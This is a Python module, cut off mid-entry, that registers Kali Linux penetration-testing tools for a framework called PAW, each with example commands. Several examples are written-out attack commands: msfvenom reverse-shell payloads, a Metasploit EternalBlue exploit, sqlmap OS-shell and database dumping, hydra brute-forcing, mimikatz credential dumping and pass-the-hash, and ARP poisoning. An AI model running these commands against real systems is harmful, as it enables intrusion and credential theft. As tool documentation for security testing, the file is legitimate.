#!/usr/bin/env python3
"""
PAW Kali Linux Tools Extension
This module adds extensive Kali Linux penetration testing tools to the PAW framework.
"""

import argparse
import json
import os
import sys
from typing import Dict, List, Any, Optional
from pathlib import Path

# Global variable declaration
global KALI_TOOLS
KALI_TOOLS = []

# Add the PAW lib directory to Python path
PAW_LIB_DIR = "/usr/local/share/paw/lib"
if os.path.exists(PAW_LIB_DIR):
    sys.path.append(PAW_LIB_DIR)
else:
    # Fallback to current directory for development
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Try to import the PAW tools registry module
try:
    from tools_registry import get_tools_registry, add_tool_to_registry
except ImportError as e:
    print(f"Error: Could not import PAW tools_registry module: {e}")
    print("Current Python path:")
    for path in sys.path:
        print(f"  - {path}")
    print("\nMake sure PAW is installed correctly and this script is in the correct directory.")
    print("You can install PAW by running: bash install.sh")
    sys.exit(1)

# Define tool categories
CATEGORIES = [
    "Information Gathering",
    "Vulnerability Analysis",
    "Web Application Analysis",
    "Database Assessment",
    "Password Attacks",
    "Wireless Attacks",
    "Bluetooth Attacks",
    "Reverse Engineering",
    "Exploitation Tools",
    "Sniffing & Spoofing",
    "Post Exploitation",
    "Forensics",
    "Reporting Tools",
    "Social Engineering Tools",
    "System Services",
    "Cryptography",
    "Hardware Hacking"
]

# Comprehensive list of Kali Linux tools with detailed information
KALI_TOOLS = [
    # Information Gathering
    {
        "name": "nmap",
        "category": "Information Gathering",
        "description": "Network exploration tool and security / port scanner with extensive capabilities for discovery and security auditing",
        "common_usage": "nmap [scan type] [options] {target}",
        "examples": [
            {"description": "Basic scan", "command": "nmap 192.168.1.1"},
            {"description": "Scan a network range", "command": "nmap 192.168.1.0/24"},
            {"description": "Aggressive scan", "command": "nmap -A 192.168.1.1"},
            {"description": "OS detection", "command": "nmap -O 192.168.1.1"},
            {"description": "Service version detection", "command": "nmap -sV 192.168.1.1"},
            {"description": "Script scan", "command": "nmap --script=default 192.168.1.1"},
            {"description": "SYN Stealth scan", "command": "nmap -sS 192.168.1.0/24"},
            {"description": "UDP port scan", "command": "nmap -sU 192.168.1.1"},
            {"description": "Fast scan of most common ports", "command": "nmap -F 192.168.1.1"},
            {"description": "Full port scan", "command": "nmap -p- 192.168.1.1"},
            {"description": "Specific port scan", "command": "nmap -p 22,80,443 192.168.1.1"},
            {"description": "Scan with timing template", "command": "nmap -T4 192.168.1.0/24"},
            {"description": "Vulnerability scan", "command": "nmap --script vuln 192.168.1.1"},
            {"description": "Save output to file", "command": "nmap -oA results 192.168.1.1"},
            {"description": "Evade firewalls", "command": "nmap -sS -Pn -D RND:5 --spoof-mac 0 192.168.1.1"},
            {"description": "Service enumeration", "command": "nmap -sV --version-intensity 9 192.168.1.1"}
        ]
    },
    {
        "name": "dmitry",
        "category": "Information Gathering",
        "description": "DMitry (Deepmagic Information Gathering Tool) gathers information about hosts",
        "common_usage": "dmitry [options] {target}",
        "examples": [
            {"description": "Basic information", "command": "dmitry example.com"},
            {"description": "Whois lookup", "command": "dmitry -w example.com"},
            {"description": "Netcraft search", "command": "dmitry -n example.com"},
            {"description": "Search for subdomains", "command": "dmitry -s example.com"},
            {"description": "Port scan", "command": "dmitry -p example.com"}
        ]
    },
    {
        "name": "recon-ng",
        "category": "Information Gathering",
        "description": "Full-featured reconnaissance framework",
        "common_usage": "recon-ng",
        "examples": [
            {"description": "Start recon-ng", "command": "recon-ng"},
            {"description": "Use a workspace", "command": "workspaces create example"}
        ]
    },
    {
        "name": "theHarvester",
        "category": "Information Gathering",
        "description": "E-mail, subdomain and people gathering tool",
        "common_usage": "theHarvester -d {domain} -l {limit} -b {source}",
        "examples": [
            {"description": "Basic search", "command": "theHarvester -d example.com -l 500 -b google"},
            {"description": "Search with all sources", "command": "theHarvester -d example.com -l 500 -b all"}
        ]
    },
    
    # Vulnerability Analysis
    {
        "name": "nikto",
        "category": "Vulnerability Analysis",
        "description": "Web server scanner which performs comprehensive tests",
        "common_usage": "nikto -h {target}",
        "examples": [
            {"description": "Basic scan", "command": "nikto -h http://example.com"},
            {"description": "Tuning for specific tests", "command": "nikto -h http://example.com -Tuning 1,2,3"}
        ]
    },
    {
        "name": "lynis",
        "category": "Vulnerability Analysis",
        "description": "Security auditing tool for Unix/Linux systems",
        "common_usage": "lynis [command] [options]",
        "examples": [
            {"description": "System audit", "command": "lynis audit system"},
            {"description": "Security scan", "command": "lynis --quick"}
        ]
    },
    
    # Web Application Analysis
    {
        "name": "sqlmap",
        "category": "Web Application Analysis",
        "description": "Automatic SQL injection tool for detecting and exploiting SQL injection flaws and taking over database servers",
        "common_usage": "sqlmap -u {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "sqlmap -u \"http://example.com/page.php?id=1\""},
            {"description": "Dump database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dump"},
            {"description": "List databases", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"},
            {"description": "Target specific database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
            {"description": "List tables in database", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname --tables"},
            {"description": "Get columns of a table", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --columns"},
            {"description": "Dump table data", "command": "sqlmap -u \"http://example.com/page.php?id=1\" -D dbname -T tablename --dump"},
            {"description": "Use POST request", "command": "sqlmap -u \"http://example.com/login.php\" --data=\"username=test&password=test\""},
            {"description": "Use cookie", "command": "sqlmap -u \"http://example.com/admin/\" --cookie=\"PHPSESSID=1234abcd\""},
            {"description": "Test form auto-detection", "command": "sqlmap -u \"http://example.com/login.php\" --forms"},
            {"description": "Use HTTP authentication", "command": "sqlmap -u \"http://example.com/admin/\" --auth-type=basic --auth-cred=\"admin:password\""},
            {"description": "Use proxy", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --proxy=http://127.0.0.1:8080"},
            {"description": "Run OS commands", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-cmd=\"id\""},
            {"description": "Get shell", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --os-shell"},
            {"description": "Use Tor anonymity", "command": "sqlmap -u \"http://example.com/page.php?id=1\" --tor --tor-type=socks5"},
            {"description": "Crawl site for injection points", "command": "sqlmap -u \"http://example.com/\" --crawl=3"}
        ]
    },
    {
        "name": "wpscan",
        "category": "Web Application Analysis",
        "description": "WordPress Security Scanner",
        "common_usage": "wpscan --url {url} [options]",
        "examples": [
            {"description": "Basic scan", "command": "wpscan --url http://wordpress-site.com"},
            {"description": "Enumerate users", "command": "wpscan --url http://wordpress-site.com --enumerate u"}
        ]
    },
    {
        "name": "dirb",
        "category": "Web Application Analysis",
        "description": "Web content scanner using dictionary files",
        "common_usage": "dirb {url} [wordlist] [options]",
        "examples": [
            {"description": "Basic scan", "command": "dirb http://example.com"},
            {"description": "Custom wordlist", "command": "dirb http://example.com /path/to/wordlist.txt"}
        ]
    },
    
    # Password Attacks
    {
        "name": "hydra",
        "category": "Password Attacks",
        "description": "Parallelized login cracker which supports numerous protocols and services for brute force attacks",
        "common_usage": "hydra -l {username}|-L {userlist} -p {password}|-P {passwordlist} {target} {protocol}",
        "examples": [
            {"description": "SSH attack", "command": "hydra -l admin -P /path/to/wordlist.txt ssh://192.168.1.1"},
            {"description": "Web form attack", "command": "hydra -l admin -P /path/to/wordlist.txt http-post-form \"login.php:username=^USER^&password=^PASS^:Login failed\""},
            {"description": "FTP attack", "command": "hydra -L users.txt -P passwords.txt ftp://192.168.1.1"},
            {"description": "SMB attack", "command": "hydra -l administrator -P /path/to/wordlist.txt smb://192.168.1.1"},
            {"description": "RDP attack", "command": "hydra -L users.txt -P passwords.txt rdp://192.168.1.1"},
            {"description": "HTTP basic auth", "command": "hydra -L users.txt -P passwords.txt http-get://192.168.1.1/admin/"},
            {"description": "MySQL attack", "command": "hydra -l root -P passwords.txt mysql://192.168.1.1"},
            {"description": "SMTP attack", "command": "hydra -l user@example.com -P passwords.txt smtp://mail.example.com"},
            {"description": "Attack with verbose output", "command": "hydra -v -l admin -P passwords.txt ssh://192.168.1.1"},
            {"description": "Limit parallel tasks", "command": "hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.1"},
            {"description": "Continue from last attempt", "command": "hydra -R -l admin -P large_wordlist.txt ssh://192.168.1.1"},
            {"description": "Use proxy", "command": "hydra -l admin -P passwords.txt -s 8080 http-proxy://192.168.1.1"}
        ]
    },
    {
        "name": "john",
        "category": "Password Attacks",
        "description": "John the Ripper password cracker with enhanced capabilities",
        "common_usage": "john [options] {password-file}",
        "examples": [
            {"description": "Basic crack", "command": "john hashes.txt"},
            {"description": "Using wordlist", "command": "john --wordlist=/path/to/wordlist.txt hashes.txt"},
            {"description": "Incremental mode", "command": "john --incremental hashes.txt"},
            {"description": "Rule-based attack", "command": "john --rules --wordlist=/path/to/wordlist.txt hashes.txt"},
            {"description": "Show cracked passwords", "command": "john --show hashes.txt"},
            {"description": "Format-specific attack", "command": "john --format=nt hashes.txt"},
            {"description": "Parallel processing", "command": "john --fork=4 hashes.txt"},
            {"description": "Restore session", "command": "john --restore=session_name"},
            {"description": "Custom rules", "command": "john --rules=custom --wordlist=/path/to/wordlist.txt hashes.txt"}
        ]
    },
    {
        "name": "hashcat",
        "category": "Password Attacks",
        "description": "Advanced password recovery tool with GPU acceleration",
        "common_usage": "hashcat [options] {hash-file} [dictionary,mask,directory]",
        "examples": [
            {"description": "Dictionary attack", "command": "hashcat -m 0 -a 0 hashes.txt /path/to/wordlist.txt"},
            {"description": "Brute force attack", "command": "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"},
            {"description": "Hybrid attack", "command": "hashcat -m 0 -a 6 hashes.txt /path/to/wordlist.txt ?d?d?d"},
            {"description": "Rule-based attack", "command": "hashcat -m 0 -a 0 hashes.txt /path/to/wordlist.txt -r /path/to/rules.txt"},
            {"description": "Mask attack with custom charset", "command": "hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d?s ?1?1?1?1?1?1"},
            {"description": "WPA/WPA2 attack", "command": "hashcat -m 2500 -a 0 capture.hccapx /path/to/wordlist.txt"},
            {"description": "NTLM attack", "command": "hashcat -m 1000 -a 0 hashes.txt /path/to/wordlist.txt"},
            {"description": "MD5 attack with GPU", "command": "hashcat -m 0 -a 0 -D 2 hashes.txt /path/to/wordlist.txt"},
            {"description": "Show cracked passwords", "command": "hashcat -m 0 --show hashes.txt"},
            {"description": "Resume interrupted session", "command": "hashcat --restore"}
        ]
    },
    
    # Wireless Attacks
    {
        "name": "aircrack-ng",
        "category": "Wireless Attacks",
        "description": "Complete suite for auditing wireless networks, including packet capture, attack, testing, and cracking",
        "common_usage": "aircrack-ng [options] <capture file(s)>",
        "examples": [
            {"description": "WPA handshake crack", "command": "aircrack-ng -w /path/to/wordlist.txt capture.cap"},
            {"description": "WEP key crack", "command": "aircrack-ng -a 1 -b 00:11:22:33:44:55 capture.cap"},
            {"description": "Start monitor mode", "command": "airmon-ng start wlan0"},
            {"description": "Scan for networks", "command": "airodump-ng wlan0mon"},
            {"description": "Targeted network capture", "command": "airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon"},
            {"description": "Deauthenticate clients", "command": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon"},
            {"description": "Filter by ESSID", "command": "aircrack-ng -e \"TargetNetwork\" -w /path/to/wordlist.txt capture.cap"},
            {"description": "Crack with GPU acceleration", "command": "aircrack-ng -w /path/to/wordlist.txt -b 00:11:22:33:44:55 --gpu-accel=N capture.cap"},
            {"description": "WPA attack with hashcat format", "command": "aircrack-ng -J output_hashcat capture.cap"},
            {"description": "WPS PIN attack", "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv"}
        ]
    },
    {
        "name": "wifite",
        "category": "Wireless Attacks",
        "description": "Automated wireless attack tool",
        "common_usage": "wifite [options]",
        "examples": [
            {"description": "Attack all networks", "command": "wifite"},
            {"description": "Target WPA only", "command": "wifite --wpa"}
        ]
    },
    
    # Exploitation Tools
    {
        "name": "metasploit",
        "category": "Exploitation Tools",
        "description": "Advanced open-source platform for developing, testing, and executing exploits against target systems",
        "common_usage": "msfconsole [options]",
        "examples": [
            {"description": "Start Metasploit", "command": "msfconsole"},
            {"description": "Use a module", "command": "use exploit/multi/handler"},
            {"description": "Start with resource script", "command": "msfconsole -r script.rc"},
            {"description": "Quiet mode", "command": "msfconsole -q"},
            {"description": "Set up reverse shell handler", "command": "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"},
            {"description": "Search for exploits", "command": "search type:exploit platform:windows cve:2021"},
            {"description": "Exploit a target", "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; exploit"},
            {"description": "Database integration with nmap", "command": "db_nmap -sV 192.168.1.0/24"},
            {"description": "List discovered hosts", "command": "hosts"},
            {"description": "List discovered services", "command": "services"},
            {"description": "List vulnerabilities", "command": "vulns"},
            {"description": "Generate a payload", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"},
            {"description": "Load auxiliary module", "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"},
            {"description": "Post-exploitation command", "command": "run post/windows/gather/hashdump"}
        ]
    },
    {
        "name": "searchsploit",
        "category": "Exploitation Tools",
        "description": "Command line search tool for Exploit-DB",
        "common_usage": "searchsploit [options] {term}",
        "examples": [
            {"description": "Basic search", "command": "searchsploit apache 2.4.7"},
            {"description": "Exact match", "command": "searchsploit -e \"WordPress 5.0\""}
        ]
    },
    
    # Sniffing & Spoofing
    {
        "name": "wireshark",
        "category": "Sniffing & Spoofing",
        "description": "Network protocol analyzer",
        "common_usage": "wireshark [options] [capture filter]",
        "examples": [
            {"description": "Start Wireshark", "command": "wireshark"},
            {"description": "Capture with filter", "command": "wireshark -i eth0 -f \"port 80\""}
        ]
    },
    {
        "name": "ettercap",
        "category": "Sniffing & Spoofing",
        "description": "Suite for man-in-the-middle attacks",
        "common_usage": "ettercap [options] [target1] [target2]",
        "examples": [
            {"description": "Graphical interface", "command": "ettercap -G"},
            {"description": "ARP poisoning", "command": "ettercap -T -q -M arp:remote /192.168.1.1/ /192.168.1.2/"}
        ]
    },
    
    # Post Exploitation
    {
        "name": "empire",
        "category": "Post Exploitation",
        "description": "PowerShell post-exploitation framework",
        "common_usage": "empire",
        "examples": [
            {"description": "Start Empire", "command": "empire"},
            {"description": "Use a listener", "command": "uselistener http"}
        ]
    },
    
    # Forensics
    {
        "name": "autopsy",
        "category": "Forensics",
        "description": "Digital forensics platform and GUI for The Sleuth Kit",
        "common_usage": "autopsy",
        "examples": [
            {"description": "Start Autopsy", "command": "autopsy"}
        ]
    },
    {
        "name": "foremost",
        "category": "Forensics",
        "description": "Recover files using their headers and footers",
        "common_usage": "foremost -i {input} -o {output}",
        "examples": [
            {"description": "Basic recovery", "command": "foremost -i /dev/sdb -o /path/to/output"}
        ]
    },
    
    # Reporting Tools
    {
        "name": "dradis",
        "category": "Reporting Tools",
        "description": "Reporting and collaboration tool",
        "common_usage": "dradis",
        "examples": [
            {"description": "Start Dradis", "command": "dradis"}
        ]
    },
    {
        "name": "ffuf",
        "category": "Web Application Analysis",
        "description": "Fast web fuzzer for discovering hidden files, directories, subdomains, and parameters in web applications",
        "common_usage": "ffuf -w {wordlist} -u {url}",
        "examples": [
            {"description": "Directory discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ"},
            {"description": "File discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ.php"},
            {"description": "Subdomain enumeration", "command": "ffuf -w /path/to/wordlist.txt -u http://FUZZ.example.com"},
            {"description": "Parameter discovery", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?FUZZ=test"},
            {"description": "Value fuzzing", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/script.php?id=FUZZ"},
            {"description": "POST data fuzzing", "command": "ffuf -w /path/to/wordlist.txt -X POST -d \"username=admin&password=FUZZ\" -u http://example.com/login"},
            {"description": "Filter by size", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fs 4242"},
            {"description": "Filter by status code", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fc 404"},
            {"description": "Multiple wordlists", "command": "ffuf -w user.txt:USER -w pass.txt:PASS -u http://example.com/login -X POST -d \"username=USER&password=PASS\""},
            {"description": "Recursion", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -recursion"},
            {"description": "Use custom headers", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -H \"X-Forwarded-For: 127.0.0.1\""},
            {"description": "Output to file", "command": "ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -o results.json -of json"}
        ]
    },
    # Bluetooth Attacks
    {
        "name": "bluetoothctl",
        "category": "Bluetooth Attacks",
        "description": "Bluetooth control tool for managing Bluetooth devices and performing attacks",
        "common_usage": "bluetoothctl [command] [options]",
        "examples": [
            {"description": "Start bluetoothctl", "command": "bluetoothctl"},
            {"description": "Scan for devices", "command": "bluetoothctl scan on"},
            {"description": "List discovered devices", "command": "bluetoothctl devices"},
            {"description": "Connect to device", "command": "bluetoothctl connect <MAC>"},
            {"description": "Pair with device", "command": "bluetoothctl pair <MAC>"},
            {"description": "Trust device", "command": "bluetoothctl trust <MAC>"},
            {"description": "Get device info", "command": "bluetoothctl info <MAC>"}
        ]
    },
    {
        "name": "bettercap",
        "category": "Bluetooth Attacks",
        "description": "Advanced MITM framework for Bluetooth and other network attacks",
        "common_usage": "bettercap [options]",
        "examples": [
            {"description": "Start bettercap", "command": "bettercap"},
            {"description": "Scan for Bluetooth devices", "command": "ble.recon on"},
            {"description": "Show discovered devices", "command": "ble.show"},
            {"description": "Connect to device", "command": "ble.connect <MAC>"},
            {"description": "Enumerate services", "command": "ble.enum <MAC>"},
            {"description": "Read characteristics", "command": "ble.read <MAC> <HANDLE>"},
            {"description": "Write to characteristic", "command": "ble.write <MAC> <HANDLE> <VALUE>"}
        ]
    },
    {
        "name": "bluelog",
        "category": "Bluetooth Attacks",
        "description": "Bluetooth discovery and logging tool",
        "common_usage": "bluelog [options]",
        "examples": [
            {"description": "Basic scan", "command": "bluelog -i hci0"},
            {"description": "Save to file", "command": "bluelog -i hci0 -o output.txt"},
            {"description": "Continuous scan", "command": "bluelog -i hci0 -c"}
        ]
    },
    {
        "name": "blueranger",
        "category": "Bluetooth Attacks",
        "description": "Bluetooth device discovery and enumeration tool",
        "common_usage": "blueranger [options]",
        "examples": [
            {"description": "Scan for devices", "command": "blueranger -i hci0"},
            {"description": "Target specific device", "command": "blueranger -i hci0 -b <MAC>"}
        ]
    },

    # Hardware Hacking
    {
        "name": "arduino-cli",
        "category": "Hardware Hacking",
        "description": "Command line interface for Arduino development",
        "common_usage": "arduino-cli [command] [options]",
        "examples": [
            {"description": "List boards", "command": "arduino-cli board list"},
            {"description": "Compile sketch", "command": "arduino-cli compile --fqbn arduino:avr:uno sketch.ino"},
            {"description": "Upload sketch", "command": "arduino-cli upload -p /dev/ttyACM0 --fqbn arduino:avr:uno sketch.ino"}
        ]
    },
    {
        "name": "flashrom",
        "category": "Hardware Hacking",
        "description": "Universal flash programming tool",
        "common_usage": "flashrom [options]",
        "examples": [
            {"description": "Read flash", "command": "flashrom -p internal -r backup.bin"},
            {"description": "Write flash", "command": "flashrom -p internal -w firmware.bin"},
            {"description": "Verify flash", "command": "flashrom -p internal -v firmware.bin"}
        ]
    },

    # Enhanced System Services
    {
        "name": "systemd-analyze",
        "category": "System Services",
        "description": "Analyze system boot performance and service dependencies",
        "common_usage": "systemd-analyze [command] [options]",
        "examples": [
            {"description": "Show boot time", "command": "systemd-analyze time"},
            {"description": "Show critical chain", "command": "systemd-analyze critical-chain"},
            {"description": "Plot boot chart", "command": "systemd-analyze plot > boot.svg"},
            {"description": "Show service dependencies", "command": "systemd-analyze dot"}
        ]
    }
]

# Add additional tools to KALI_TOOLS

# Additional reconnaissance tools
KALI_TOOLS.extend([
    {
        "name": "amass",
        "category": "Information Gathering",
        "description": "In-depth DNS enumeration and asset discovery",
        "common_usage": "amass enum -d {domain}",
        "examples": [
            {"description": "Basic enumeration", "command": "amass enum -d example.com"},
            {"description": "Passive mode", "command": "amass enum -passive -d example.com"}
        ]
    },
    {
        "name": "sublist3r",
        "category": "Information Gathering",
        "description": "Fast subdomains enumeration tool",
        "common_usage": "sublist3r -d {domain}",
        "examples": [
            {"description": "Enumerate subdomains", "command": "sublist3r -d example.com"}
        ]
    }
])

# Additional Web Application tools
KALI_TOOLS.extend([
    {
        "name": "gobuster",
        "category": "Web Application Analysis",
        "description": "Directory/file and DNS busting tool",
        "common_usage": "gobuster [mode] [options]",
        "examples": [
            {"description": "Directory scan", "command": "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt"}
        ]
    },
    {
        "name": "ffuf",
        "category": "Web Application Analysis",
        "description": "Fast web fuzzer",
        "common_usage": "ffuf -w {wordlist} -u {url}",
        "examples": [
            {"description": "Directory scan", "command": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ"}
        ]
    }
])

# Post Exploitation tools
KALI_TOOLS.extend([
    {
        "name": "empire",
        "category": "Post Exploitation",
        "description": "PowerShell post-exploitation agent",
        "common_usage": "empire",
        "examples": [
            {"description": "Start Empire", "command": "empire"},
            {"description": "Use REST API", "command": "empire --rest --username admin --password password"}
        ]
    },
    {
        "name": "mimikatz",
        "category": "Post Exploitation",
        "description": "Windows credential dumping tool",
        "common_usage": "mimikatz.exe",
        "examples": [
            {"description": "Dump passwords", "command": "mimikatz # sekurlsa::logonpasswords"},
            {"description": "Pass the hash", "command": "mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /ntlm:hash"}
        ]
    },
    {
        "name": "bloodhound",
        "category": "Post Exploitation",
        "description": "Active Directory reconnaissance tool",
        "common_usage": "bloodhound",
        "examples": [
            {"description": "Start BloodHound", "command": "bloodhound"},
            {"description": "Collect data", "command": "bloodhound-python -d example.com -u username -p password -c All"}
        ]
    }
])

# Additional Forensics tools
KALI_TOOLS.extend([
    {
        "name": "volatility",
        "category": "Forensics",
        "description": "Advanced memory forensics framework",
        "common_usage": "volatility -f {memory.dump} [plugin]",
        "examples": [
            {"description": "Identify profile", "command": "volatility -f memory.dmp imageinfo"},
            {"description": "Process list", "command": "volatility -f memory.dmp --profile=Win7SP1x64 pslist"},
            {"description": "Network connections", "command": "volatility -f memory.dmp --profile=Win7SP1x64 netscan"}
        ]
    },
    {
        "name": "autopsy",
        "category": "Forensics",
        "description": "Digital forensics platform",
        "common_usage": "autopsy",
        "examples": [
            {"description": "Start Autopsy", "command": "autopsy"}
        ]
    },
    {
        "name": "binwalk",
        "category": "Forensics",
        "description": "Firmware analysis tool",
        "common_usage": "binwalk [options] {file}",
        "examples": [
            {"description": "Analyze firmware", "command": "binwalk firmware.bin"},
            {"description": "Extract files", "command": "binwalk -e firmware.bin"}
        ]
    }
])

# Additional Cryptography tools
KALI_TOOLS.extend([
    {
        "name": "hashid",
        "category": "Cryptography",
        "description": "Hash identifier tool",
        "common_usage": "hashid {hash}",
        "examples": [
            {"description": "Identify hash", "command": "hashid 5f4dcc3b5aa765d61d8327deb882cf99"}
        ]
    },
    {
        "name": "hash-identifier",
        "category": "Cryptography",
        "description": "Hash type identification tool",
        "common_usage": "hash-identifier",
        "examples": [
            {"description": "Start tool", "command": "hash-identifier"}
        ]
    }
])

# Sniffing & Spoofing tools
KALI_TOOLS.extend([
    {
        "name": "wireshark",
        "category": "Sniffing & Spoofing",
        "description": "Network protocol analyzer",
        "common_usage": "wireshark [options] [capture filter]",
        "examples": [
            {"description": "Start Wireshark", "command": "wireshark"},
            {"description": "Capture on interface", "command": "wireshark -i eth0"},
            {"description": "Read capture file", "command": "wireshark -r capture.pcap"}
        ]
    },
    {
        "name": "tcpdump",
        "category": "Sniffing & Spoofing",
        "description": "Command-line packet analyzer",
        "common_usage": "tcpdump [options] [expression]",
        "examples": [
            {"description": "Capture on interface", "command": "tcpdump -i eth0"},
            {"description": "Capture HTTP traffic", "command": "tcpdump -i eth0 port 80"},
            {"description": "Write to file", "command": "tcpdump -i eth0 -w capture.pcap"}
        ]
    },
    {
        "name": "responder",
        "category": "Sniffing & Spoofing",
        "description": "LLMNR, NBT-NS and MDNS poisoner",
        "common_usage": "responder -I {interface} [options]",
        "examples": [
            {"description": "Basic poisoning", "command": "responder -I eth0"},
            {"description": "Analyze mode", "command": "responder -I eth0 -A"}
        ]
    },
    {
        "name": "bettercap",
        "category": "Sniffing & Spoofing",
        "description": "Swiss army knife for network attacks",
        "common_usage": "bettercap [options]",
        "examples": [
            {"description": "Start on interface", "command": "bettercap -iface eth0"},
            {"description": "Web interface", "command": "bettercap -iface eth0 -caplet http-ui"}
        ]
    }
])

# Additional exploitation tools
KALI_TOOLS.extend([
    {
        "name": "msfvenom",
        "category": "Exploitation Tools",
        "description": "Metasploit payload generator",
        "common_usage": "msfvenom -p {payload} [options]",
        "examples": [
            {"description": "Windows reverse shell", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"},
            {"description": "Linux reverse shell", "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf"},
            {"description": "Web payload", "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.php"}
        ]
    },
    {
        "name": "searchsploit",
        "category": "Exploitation Tools",
        "description": "Command line search tool for Exploit-DB",
        "common_usage": "searchsploit [options] {term}",
        "examples": [
            {"description": "Basic search", "command": "searchsploit apache 2.4.7"},
            {"description": "Copy exploit", "command": "searchsploit -m 12345"}
        ]
    }
])

# Mobile Security tools
KALI_TOOLS.extend([
    {
        "name": "apktool",
        "category": "Reverse Engineering",
        "description": "Tool for reverse engineering Android APK files",
        "common_usage": "apktool [d|b] [options] {file}",
        "examples": [
            {"description": "Decompile APK", "command": "apktool d application.apk"},
            {"description": "Build APK", "command": "apktool b decompiled_folder -o new_application.apk"}
        ]
    },
    {
        "name": "dex2jar",
        "category": "Reverse Engineering",
        "description": "Tool to convert Android .dex files to Java .jar files",
        "common_usage": "d2j-dex2jar [options] {file}",
        "examples": [
            {"description": "Convert APK", "command": "d2j-dex2jar application.apk"}
        ]
    }
])

# Web Applications
KALI_TOOLS.extend([
    {
        "name": "burpsuite",
        "category": "Web Application Analysis",
        "description": "Integrated platform for performing security testing of web applications",
        "common_usage": "burpsuite [options]",
        "examples": [
            {"description": "Start Burp Suite", "command": "burpsuite"},
            {"description": "Start with project", "command": "burpsuite --project-file=project.burp"}
        ]
    },
    {
        "name": "zaproxy",
        "category": "Web Application Analysis",
        "description": "OWASP Zed Attack Proxy for finding vulnerabilities in web applications",
        "common_usage": "zaproxy [options]",
        "examples": [
            {"description": "Start ZAP", "command": "zaproxy"},
            {"description": "Headless mode", "command": "zaproxy -daemon"}
        ]
    },
    {
        "name": "whatweb",
        "category": "Web Application Analysis",
        "description": "Web scanner that identifies technologies on websites",
        "common_usage": "whatweb [options] {target}",
        "examples": [
            {"description": "Basic scan", "command": "whatweb example.com"},
            {"description": "Aggressive scan", "command": "whatweb -a 3 example.com"}
        ]
    }
])

# Additional Kali Linux Tools to add to the existing collection
 
# Network Reconnaissance
KALI_TOOLS.extend([
    {
        "name": "fierce",
        "category": "Information Gathering",
        "description": "Domain DNS scanner that can locate non-contiguous IP space and hostnames against specified domains",
        "common_usage": "fierce --domain {domain}",
        "examples": [
            {"description": "Basic scan", "command": "fierce --domain example.com"},
            {"description": "Use custom wordlist", "command": "fierce --domain example.com --wordlist /path/to/wordlist.txt"},
            {"description": "Specify DNS server", "command": "fierce --domain example.com --dns-servers 8.8.8.8"}
        ]
    },
    {
        "name": "masscan",
        "category": "Information Gathering",
        "description": "TCP port scanner, similar to nmap but much faster for Internet-scale network scanning",
        "common_usage": "masscan {target} -p{ports}",
        "examples": [
            {"description": "Basic scan", "command": "masscan 192.168.1.0/24 -p80,443"},
            {"description": "Scan range of ports", "command": "masscan 192.168.1.0/24 -p1-65535"},
            {"description": "Maximum rate", "command": "masscan 192.168.1.0/24 -p1-65535 --rate=10000"},
            {"description": "Output to file", "command": "masscan 192.168.1.0/24 -p1-65535 -oX results.xml"}
        ]
    },
    {
        "name": "dnsenum",
        "category": "Information Gathering",
        "description": "Multithreaded DNS enumeration and network mapping tool",
        "common_usage": "dnsenum {domain}",
        "examples": [
            {"description": "Basic enumeration", "command": "dnsenum example.com"},
            {"description": "Brute force", "command": "dnsenum --enum -p 10 -s 100 -f /path/to/wordlist.txt example.com"}
        ]
    },
    {
        "name": "enum4linux",
        "category": "Information Gathering",
        "description": "Tool for enumerating information from Windows and Samba systems",
        "common_usage": "enum4linux [options] {target}",
        "examples": [
            {"description": "Full enumeration", "command": "enum4linux -a 192.168.1.10"},
            {"description": "User enumeration", "command": "enum4linux -U 192.168.1.10"},
            {"description": "Password policy", "command": "enum4linux -P 192.168.1.10"}
        ]
    }
])

# Web Application Security
KALI_TOOLS.extend([
    {
        "name": "skipfish",
        "category": "Web Application Analysis",
        "description": "Fully automated, active web application security reconnaissance tool",
        "common_usage": "skipfish -o {output_dir} -S {wordlist} {target}",
        "examples": [
